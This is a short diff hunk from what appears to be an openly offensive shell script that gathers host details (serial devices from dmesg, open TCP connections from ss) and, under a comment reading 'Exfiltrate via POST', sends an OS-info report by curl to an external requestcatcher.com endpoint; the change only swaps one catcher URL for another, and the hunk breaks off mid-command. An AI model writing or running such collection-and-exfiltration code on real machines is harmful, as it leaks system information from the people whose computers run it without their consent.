@@ -53,7 +53,7 @@ serial_devices=$(dmesg | grep tty)
 tcp_connections=$(ss -tunapl)
 
 # === Exfiltrate via POST ===
-curl -X POST https://flipped.requestcatcher.com \
+curl -X POST https://nina-flip-test.requestcatcher.com/ \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-urlencode "debug=
 ==== [OS INFO] ====
